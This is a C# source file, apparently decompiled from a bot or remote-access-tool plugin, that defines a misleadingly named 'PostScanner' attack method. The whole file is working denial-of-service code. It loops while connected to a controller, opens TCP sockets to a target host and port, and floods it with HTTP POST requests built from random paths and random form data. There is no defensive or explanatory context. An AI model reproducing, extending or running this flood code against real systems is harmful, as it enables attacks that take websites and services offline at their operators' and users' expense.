using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using Plugin.Helper;

namespace Plugin.Methods;

internal class PostScanner : Method
{
	public string Name { get; } = "PostScanner";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				string text = "";
				if (Randomizer.random.Next(3) == 0)
				{
					for (int i = 0; i < Randomizer.random.Next(5); i++)
					{
						text = text + "/" + Common.subhtml[Randomizer.random.Next(Common.subhtml.Length)];
					}
					if (Randomizer.random.Next(2) == 0)
					{
						text += Common.subexiteons[Randomizer.random.Next(Common.subexiteons.Length)];
					}
				}
				List<string> list = new List<string>();
				for (int j = 0; j < Randomizer.random.Next(5); j++)
				{
					list.Add(Randomizer.getRandomCharactersAscii() + "=" + Randomizer.getRandomCharactersAscii());
				}
				string text2 = string.Join("&", (IEnumerable<string?>)list.ToArray());
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				byte[] bytes = Encoding.ASCII.GetBytes("POST " + text + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + text2.Length + "\r\nConnection: Close\r\n\r\n" + text2);
				socket.Send(bytes);
				socket.Dispose();
			}
			catch
			{
			}
		}
	}
}
